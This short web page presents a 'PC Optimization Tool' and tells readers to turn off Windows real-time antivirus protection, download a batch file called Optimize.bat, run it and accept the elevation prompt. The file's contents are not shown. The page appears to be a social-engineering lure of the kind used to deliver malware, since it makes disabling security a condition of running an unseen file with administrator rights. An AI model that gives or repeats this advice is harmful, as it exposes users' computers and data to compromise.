PC Optimization Tool

Generate a script to help clean and maintain your Windows PC.

Instructions

Important Security Notice

Antivirus software may block this script because it uses system tools. For it to work, you must **temporarily disable your antivirus** before running it.

  1. Disable Antivirus: Go to "Windows Security" > "Virus & threat protection" and turn off "Real-time protection".
  2. Download the Script: Click the button below to download the `Optimize.bat` file.
  3. Run the Script: Find the downloaded file and **double-click** it. When the Windows security prompt appears, click **"Yes"**.
  4. Re-enable Antivirus: After the script finishes, remember to turn your antivirus protection back on.
